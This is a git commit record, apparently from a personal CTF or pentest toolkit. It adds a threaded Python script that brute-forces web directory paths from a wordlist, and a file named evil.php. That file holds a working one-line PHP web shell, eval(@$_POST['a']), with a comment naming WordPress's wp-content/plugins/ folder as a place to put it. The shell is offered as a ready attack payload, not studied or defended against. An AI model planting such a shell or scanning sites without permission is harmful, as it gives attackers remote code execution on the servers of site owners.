2f3d135fd6971c411a3165bf4408dad610880469
kaii <kaii@openingsource.org>
2019-04-07 09:00:25 +0800

    new file:   Info/scanCTF-master/LICENSE 	new file:   Info/scanCTF-master/README.md 	new file:   Info/scanCTF-master/dictionary/default.txt 	new file:   Info/scanCTF-master/scan.py 	new file:   Info/scanCTF-master/submd5.py 	new file:   XML/bind.xml 	new file:   XML/poc.xml 	new file:   XML/q.txt 	new file:   php/base_php/evil.php

---
+++ Info/scanCTF-master/scan.py
@@ -0,0 +1,60 @@
+#coding=utf-8
+__author__ = "yunsle"
+import threading
+import requests
+import os
+import sys
+from multiprocessing import Queue
+import time
+
+q = Queue()
+thread_num = 8
+
+def getFuzzUrl():
+	try:
+		f = open('./dictionary/default.txt','r')
+		lines = f.readlines()
+		f.close()
+		for line in lines:
+			q.put(line.rstrip('\n'))
+	except Exception as e:
+		print(e)
+def request(url):
+	r = requests.get(url)
+	return r.status_code
+
+def scan():
+	# Start scanning
+	while not q.empty():
+		extUrl = q.get()
+		code = request(baseUrl+extUrl)
+		if code!=404:
+			print(str(code)+"--------------------"+baseUrl+extUrl.strip())
+	
+
+threads=[]
+if __name__ == '__main__':
+	try:
+		baseUrl = sys.argv[1].rstrip('/')
+	except Exception as e:
+		print(e)
+		print("ERROR:::Please input the baseurl.")
+		sys.exit(1)
+	try:
+		code = request(baseUrl)
+	except Exception as e:
+		print(e)
+		print("ERROR:::The baseurl is not valid.")
+		sys.exit(1)
+	getFuzzUrl()
+
+	st = time.time()
+	for i in range(thread_num):
+		threads.append(threading.Thread(target=scan))
+	for i in range(thread_num):
+		threads[i].setDaemon(True)
+		threads[i].start()
+	for i in range(thread_num):
+		threads[i].join()
+	et = time.time()
+	print("Cost time %.3fs" % (et - st))
---
+++ php/base_php/evil.php
@@ -0,0 +1,5 @@
+<?php
+eval(@$_POST['a']);
+
+
+//wordpress wp-content/plugins/
